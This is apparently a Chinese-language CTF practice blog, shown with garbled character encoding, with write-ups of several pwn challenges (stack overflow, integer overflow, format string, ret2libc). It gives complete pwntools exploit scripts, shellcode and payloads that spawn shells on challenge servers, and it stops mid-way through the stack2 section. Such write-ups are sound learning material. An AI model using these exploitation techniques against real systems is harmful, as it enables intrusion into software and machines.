        <content type="html"><![CDATA[<p>pwnçš„ä¸€äº›ç»ƒä¹ è®°å½•~<a id="more"></a></p><h2 id="æ”»é˜²ä¸–ç•Œ"><a href="#æ”»é˜²ä¸–ç•Œ" class="headerlink" title="æ”»é˜²ä¸–ç•Œ"></a>æ”»é˜²ä¸–ç•Œ</h2><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><blockquote><p>æ ˆæº¢å‡º</p></blockquote><p>idaæ‰“å¼€çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180206603.png" alt="image-20200604180206603"></p><p>å¯ä»¥çŸ¥é“è¿™ä¸ªéšæœºæ•°ç§å­æˆ‘ä»¬æ˜¯ä¸çŸ¥é“çš„ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡gets(v7)ï¼Œé€šè¿‡æ ˆæº¢å‡ºæŠŠè¿™ä¸ªç§å­æ¢æˆ1ï¼Œå†ç”¨1è®¡ç®—å‡ºéšæœºæ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46809</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'a'</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">l = <span class="string">'2542625142'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">p.recvuntil(<span class="string">'input'</span>)</span><br><span class="line">p.sendline(i)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200604180443703.png" alt="image-20200604180443703"></p><p><strong>æ€»ç»“ï¼šå¯¹æ ˆæ›´åŠ ç†Ÿæ‚‰ã€‚</strong></p><h3 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h3><blockquote><p>æ ˆæº¢å‡ºï¼Œæ§åˆ¶ç¨‹åºèµ°å‘</p></blockquote><p> ä½¿ç”¨checksecçœ‹ä¸€ä¿æŠ¤ï¼Œæ²¡æœ‰canaryã€‚</p><p> idaä¸­çœ‹ä¸€ä¸‹ï¼Œgets()å­˜åœ¨æº¢å‡ºï¼Œæœ‰system()å‡½æ•°ï¼Œä½†æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„shellã€‚å’Œä¹‹å‰åœ¨è®ºå‰‘åœºåšè¿‡çš„å¾ˆåƒï¼Œåªä¸è¿‡é‚£ä¸ªæ˜¯64ä½ï¼Œè¿™ä¸ªæ˜¯32ä½ï¼Œå‚æ•°ä¼ é€’ä¸åŒè€Œå·²ã€‚</p><p>  <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605123722286.png" alt="image-20200605123722286"></p><p> å°è¯•ä½¿ç”¨ ROPgadgetæœç´¢<strong>$0</strong>,æ— æœã€‚ä½†å›åˆ°ç¨‹åºçœ‹åˆ°æœ‰ä¸€ä¸ªå…¨å±€å˜é‡è®©æˆ‘ä»¬è¾“å…¥nameï¼Œé‚£å°±è‡ªå·±æ„é€ ã€‚</p><p> æ‰¾åˆ°systemçš„åœ°å€ï¼Œå†™pyè„šæœ¬ã€‚</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53127</span>)</span><br><span class="line">s = <span class="string">'$0'</span> <span class="comment">#è¿™é‡Œä¹Ÿå¯ä»¥'/bin/sh'</span></span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x26</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x0804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°shellã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605124200541.png" alt="image-20200605124200541"></p><p><strong>æ€»ç»“ï¼šä¸Šæ¬¡æ˜¯64ä½ï¼Œè¿™æ¬¡ä½“éªŒäº†32ä½ç¨‹åºï¼Œä¼ å‚ä¸åŒã€‚</strong></p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><blockquote><p>æ ˆæº¢å‡ºï¼Œæ•´æ•°æº¢å‡º</p></blockquote><p>æ²¡æœ‰å¼€å¯canaryï¼Œåœ¨idaä¸­å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªloginå‡½æ•°éƒ½ä¸å­˜åœ¨æº¢å‡ºã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161502591.png" alt="image-20200605161502591"></p><p>ä½†ä»æœç´¢çš„å­—ç¬¦ä¸²æ‰¾åˆ°å¼•ç”¨ï¼Œæœ‰ä¸€ä¸ªsystem(â€œcat flagâ€)ï¼Œæ‰€ä»¥è¿˜æ˜¯è€ƒè™‘é€šè¿‡æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚</p><p>æœç„¶åœ¨<strong>check_passwdï¼ˆ&amp;bufï¼‰</strong>å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¿™é‡Œå°±æ˜¯å¤šäº†ä¸ªæ•´æ•°æº¢å‡ºã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605161944323.png" alt="image-20200605161944323"></p><p>ç”±äºä¸€ä¸ªå­—èŠ‚æ— ç¬¦å·çš„èŒƒå›´ï¼ˆ0-255ï¼‰ï¼Œé‚£æˆ‘ä»¬æœ€å°åªè¦260å°±å¯ä»¥è®©v3==4å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54696</span>)</span><br><span class="line">payload = (<span class="number">0x14</span>+<span class="number">4</span>)*<span class="string">'a'</span> + p32(<span class="number">0x08048694</span>) + (<span class="number">260</span><span class="number">-28</span>)*<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'username:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'passwd:'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605163357042.png" alt="image-20200605163357042"></p><p><strong>æ€»ç»“ï¼šå¯¹æ•´æ•°æº¢å‡ºæœ‰äº†äº†è§£ã€‚</strong></p><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><blockquote><p>æ ¼å¼åŒ–å­—ç¬¦æ¢æ¼æ´ï¼Œå†™å…¥shellcodeã€‚ä½†æ˜¯æœ‰å¾ˆå¤šé€»è¾‘å¹²æ‰°ï¼Œå…³é”®è¿˜æ˜¯åˆ†æåˆ°å¼ºåˆ¶è½¬åŒ–ä¸ºå‡½æ•°åˆ°æ‰§è¡Œï¼Œè”ç³»åˆ°æ‰§è¡Œè‡ªå·±çš„shellcodeã€‚</p></blockquote><p>ç¨‹åºé™¤äº†åŸºå€éšæœºåŒ–ä¿æŠ¤å…³äº†ï¼Œå…¶ä»–å…¨å¼€ã€‚</p><p>è½½å…¥idaæ‰¾æ¼æ´ï¼Œæ„Ÿè§‰æœ‰ç‚¹å¤æ‚ï¼Œä¸€ä¸ªå°æ¸¸æˆï¼Œå‡½æ•°æœ‰ç‚¹å¤šã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰å…³é”®å­—ç¬¦ä¸²ä¸systemï¼ˆï¼‰å‡½æ•°ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¾€å†™shellcodeæ–¹é¢æƒ³ã€‚æœç„¶åœ¨<strong>sub_400CA6((_DWORD *)a1);</strong>ä¸­æ‰¾åˆ°äº†ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605203928195.png" alt="image-20200605203928195"></p><p>ä½†è¦ä½¿æ•´ä¸ªå‡½æ•°æ‰§è¡Œï¼Œä¸Šé¢æœ‰ä¸ªåˆ¤æ–­ï¼Œ<strong>*a1 == a1[1]</strong>ï¼Œå¯»æ‰¾*a1çš„å‚æ•°æ¥æºï¼Œå¯ä»¥çŸ¥é“ä½¿main()å‡½æ•°é‡Œçš„v4ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605221940761.png" alt="image-20200605221940761"></p><p>è¿™æ—¶å€™çœ‹æœ‰æ²¡æœ‰åœ°æ–¹å¯ä»¥è®©ç€2ä¸ªæ•°ç›¸ç­‰ã€‚è¿˜æœ‰2ä¸ªå…³é”®å‡½æ•°ä»”ç»†çœ‹çš„ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222351181.png" alt="image-20200605222351181"></p><p>è¿›å…¥<strong>sub_400A7D()</strong>ï¼Œç›´æ¥è¾“å…¥eastè·³è¿‡å°±å¥½äº†ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605222611543.png" alt="image-20200605222611543"></p><p>å†çœ‹<strong>sub_400BB9()</strong>,æ­£å¥½è¿™é‡Œæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¸”æœ‰æç¤ºä¿¡æ¯ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605224545388.png" alt="image-20200605224545388"></p><p>ä¸‹é¢ç”¨gdbè°ƒè¯•çœ‹çœ‹v2çš„å€¼åœ¨ç¬¬å‡ ä¸ªå‚æ•°ä½ç½®ã€‚åœ¨printf()å¤„ä¸‹æ–­ç‚¹ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605225102222.png" alt="image-20200605225102222"></p><p>ä½†æ˜¯æ³¨æ„è¿™æ˜¯64ä½ç¨‹åºï¼Œå…ˆæ˜¯ä½¿ç”¨6ä¸ªå¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼ˆrdi, rsi, rdx, rcx, r8, r9ï¼‰,è€Œè¿™é‡Œ<strong>rdi</strong>ä½œä¸ºäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ï¼Œé‚£å¯„å­˜å™¨è¿˜æœ‰5ä¸ªç”¨æ¥ä¼ é€’å‚æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ”¹å˜åœ°å€çš„å€¼å°±æ˜¯ç¬¬(5+2) = 7ä¸ªå‚æ•°äº†ã€‚</p><p>å¼€å§‹å†™è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug' è¿™ä¸ªå¯ä»¥å°†æ¯ä¸€æ­¥çš„è°ƒè¯•ä¿¡æ¯åé¦ˆç»™ç”¨æˆ·ã€‚</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">46461</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">addr = int(p.recv(<span class="number">7</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">p.sendline(<span class="string">'Bnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'east'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"address'"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">'wish is:'</span>)</span><br><span class="line">p.sendline(<span class="string">'%085d%7$n'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>) <span class="comment">#è¿™é‡Œshellcodeçš„2ä¸­å†™æ³•ã€‚</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#shellcode="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'YOU SPELL'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606091645885.png" alt="image-20200606091645885"></p><p><strong>æ€»ç»“ï¼š1.shellcodeçš„å†™æ³•ï¼šä¸€ï¼šé€šè¿‡shellcraft ä¸€ä¸ªç”Ÿæˆshellcodeçš„ç±»ã€‚shellcraft.sh()è·å¾—æ‰§è¡Œsystem(â€œ/bin/shâ€)æ±‡ç¼–ä»£ç æ‰€å¯¹åº”çš„æœºå™¨ç ã€‚äºŒï¼šé€šè¿‡åæ±‡ç¼–çš„shellcodeä»£ç ã€‚2.å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŠ64ä½ä¼ å‚åŠ æ·±äº†ç†è§£ã€‚3.åˆ†æé•¿çš„é¢˜ç›®ã€‚</strong></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><blockquote><p>å¼€å§‹æŸ¥ä¿æŠ¤åæ²¡æ³¨æ„åˆ°NXï¼Œåœ¨æ ˆä¸Šå‡ æ¬¡æ²¡æ‰§è¡ŒæˆåŠŸæ‰å›å»çœ‹åˆ°ã€‚è¿™ä¸ªé¢˜å®é™…è¿˜æ˜¯æ ˆæº¢å‡ºï¼Œä½†å¤šè€ƒäº†å¾ˆå¤šçŸ¥è¯†ç‚¹ï¼Œå¯¹åˆšæ¥è§¦pwnæ”¶è·è¿˜æ˜¯å¾ˆå¤§ã€‚</p></blockquote><p>é¦–å…ˆæŸ¥ä¿æŠ¤ï¼Œåªå¼€äº†NXï¼Œæ²¡æœ‰canaryï¼Œé‚£å°±å¯ä»¥å¾€é æº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘äº†çš„æ–¹å‘çœ‹é¢˜ã€‚</p><p>è½½å…¥idaåï¼Œæ ˆæº¢å‡ºå¾ˆæ˜æ˜¾ã€‚</p><p> <img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606153058583.png" alt="image-20200606153058583"></p><p>ä½†åˆ©ç”¨èµ·æ¥ï¼Œæ—¢æ²¡æœ‰æœ‰systemå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰â€™/bin/shâ€™ã€‚è¿™å¯¹äºåˆšæ¥è§¦pwnè¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œä½†æœ¬æ¥å°±å­¦ä¹ çš„è¿‡ç¨‹ï¼Œçœ‹äº†writeupåˆå»å­¦äº†ä¸‹.pltä¸.gotå†æ¥åšçš„é¢˜ã€‚</p><p>å…¶å®ç¨‹åºå¸¦äº†ä¸€ä¸ªè¿è¡Œåº“çš„ï¼Œé‡Œé¢æœ‰åŠ¨æ€é“¾æ¥åº“çš„å‡½æ•°åŠä¸€äº›å…¶ä»–ä¿¡æ¯ã€‚æ—¢ç„¶ç¨‹åºé‡Œæ²¡æœ‰è‡ªç„¶å°±åˆ©ç”¨è¿™ä¸ªè¿è¡Œåº“äº†ï¼Œæ ¹æ®elfæ–‡ä»¶ä¸peæ–‡ä»¶ç±»ä¼¼ï¼Œå„ä¸ªå‡½æ•°ä¸æ•°æ®çš„ç›¸å¯¹åœ°å€æ˜¯ä¸å˜çš„ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ä¸æˆ‘ä»¬åœ¨ç¨‹åºä¸­æ˜¯è°ƒç”¨äº†writeä¸readåŠ¨æ€åº“å‡½æ•°çš„ï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªå¾—åˆ°ä»–ä»¬çš„åœ°å€ï¼Œå†æ ¹æ®ç›¸å¯¹åœ°å€ç›¸åŠ å‡å°±å¾—åˆ°æˆ‘ä»¬è¦çš„å‡½æ•°ä¸æ•°æ®ï¼ˆsystem()ä¸â€˜/bin/shâ€™ï¼‰çš„åœ°å€äº†ã€‚</p><p>é¦–å…ˆè®¡ç®—åœ¨è¿è¡Œåº“é‡Œçš„çš„readå‡½æ•°ä¸systemå‡½æ•°çš„ç›¸å¯¹åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sys_cha = hex(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>è®¡ç®—è¿è¡Œåº“ä¸­readå‡½æ•°ä¸ â€˜/bin/shâ€™çš„ç›¸å¯¹åœ°å€ã€‚å…ˆæ‰¾åˆ° â€™/bin/shâ€™çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so<span class="number">.6</span> --string <span class="string">'/bin/sh'</span></span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606155906601.png" alt="image-20200606155906601"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">bin_cha = hex(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br></pre></td></tr></table></figure><p>æœ‰ a-b=cï¼Œç°åœ¨æˆ‘ä»¬æœ‰äº†cï¼Œåªéœ€é€šè¿‡ç¨‹åºæº¢å‡ºå°±å¯ä»¥æ‰¾åˆ°b, æœ€åé€š a = b+cå¾—åˆ°æˆ‘ä»¬è¦çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>å°†å„éƒ¨åˆ†ç»“åˆèµ·æ¥ï¼Œè„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">54407</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(elf.plt[<span class="string">'write'</span>])+p32(elf.symbols[<span class="string">'main'</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">bin_cha = int(<span class="number">0x0015902b</span>-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">bin_addr = read_addr + bin_cha</span><br><span class="line"></span><br><span class="line">sys_cha = int(lib.symbols[<span class="string">'system'</span>]-lib.symbols[<span class="string">'read'</span>])</span><br><span class="line">sys_addr = read_addr + sys_cha</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload1 = (<span class="number">0x88</span>+<span class="number">4</span>)*<span class="string">'a'</span>+p32(sys_addr)+p32(<span class="number">1</span>)+p32(bin_addr)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200606172047471.png" alt="image-20200606172047471"></p><p><strong>æ€»ç»“ï¼š1.u32()ç›¸å½“äºp32()çš„é€†è¿ç®—ã€‚2.ELFçš„å„ç§ä½¿ç”¨ã€‚3.å¯¹.pltä¸.gotçš„å­¦ä¹ ã€‚4. ä»è¿è¡Œåº“å¯»æ‰¾æ‰€è¦å‡½æ•°ä¸æ•°æ®ã€‚5.è¿™é“é¢˜å¯¹äºåˆšæ¥è§¦pwnçš„æ¥åšï¼Œå¯åšæ€§å¾ˆé«˜ã€‚</strong></p><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote><p>ä¸Šä¹‹å‰åšçš„ guess_game ä¸€ä¸ªé“ç†ã€‚é€šè¿‡æ ˆæº¢å‡ºï¼Œæ”¹å˜ç¨‹åºç‰¹å®šçš„å€¼ã€‚</p></blockquote><p>æŸ¥ä¿æŠ¤æ²¡æœ‰ canaryï¼Œè¿™ä¹Ÿç®—æ˜¯å¼•å¯¼äº†ï¼Œå› ä¸ºæ˜¯åšé¢˜ã€‚</p><p>idaä¸­çœ‹ä¸€ä¸‹ã€‚å°±æ˜¯éšæœºæ•°ç§å­ç²¾ç¡®åˆ°äº†ç§’ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡æ ˆæº¢å‡ºæ”¹å˜ç§å­çš„å€¼ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160312039.png" alt="image-20200607160312039"></p><p>å†™è„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">43642</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x50</span><span class="number">-0x10</span>)*<span class="string">'a'</span> + p64(<span class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png" alt="image-20200607160518598"></p><p><strong>æ€»ç»“ï¼š1.è™½ç„¶æ²¡æœ‰æ¥è§¦æ–°çŸ¥è¯†ï¼Œä½†æ˜¯å­¦äº†åŠ è½½libc.so.6åº“ä½¿ç”¨å…¶çš„å‡½æ•°ã€‚</strong></p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote><p>ç”±äºæ•°ç»„æ²¡æœ‰æ§åˆ¶ç•Œé™ï¼Œè¿˜æ˜¯æ ˆæº¢å‡ºã€‚è¿™ä¸ªé¢˜ç”±äºå‡ºé¢˜äººåœ¨é¢˜ä¸­ç›´æ¥ç»™å‡ºäº†bin/bashï¼Œè€Œç¯å¢ƒä¸­åªæœ‰shï¼Œä½†åªè¦ROPä¸€ä¸‹ï¼Œè‡ªå·±é€šè¿‡bin/bashæ„é€ shç»™systemåšå‚æ•°å³å¯ã€‚</p></blockquote><p>æŸ¥ä¿æŠ¤ï¼Œé™¤äº†åŸºåœ°å€éšæœºåŒ–å…¶ä»–å…¨å¼€ã€‚æ„Ÿè§‰ä¼šæœ‰ç‚¹éº»çƒ¦ï¼Œéš¾åº¦è¦ç»•è¿‡canaryï¼Ÿidaä¸­çœ‹ä¸€ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png" alt="image-20200609105006912"></p><p>æ­£å¥½çœ‹åˆ°å­—ç¬¦ä¸²ä¸­æœ‰ç°æˆçš„systemå‡½æ•°åŠshellï¼Œæ‰€ä»¥é€šè¿‡ä¸Šé¢çš„æ•°ç»„æº¢å‡ºå°†å‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸ºsystemå¤„çš„åœ°å€å°±å¾—åˆ°shelläº†ã€‚</p><p>å¼€å§‹è®¡ç®—æ•°ç»„çš„åœ°å€åˆ°å‡½æ•°è¿”å›åœ°å€å¤„åœ¨æ ˆä¸­çš„åç§»ï¼Œç”±äºidaä¸­é™æ€çœ‹åˆ°çš„æ ˆåˆ†å¸ƒå¯èƒ½ä¸å‡†ï¼Œé€šè¿‡gdbåŠ¨è°ƒçœ‹ä¸€ä¸‹ã€‚æ‰¾åˆ°ç¬¬ä¸€æ¬¡ç»™æ•°ç»„èµ‹å€¼çš„åœ°å€åŠæœ€åretæŒ‡ä»¤åœ°å€ä¸‹æ–­ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png" 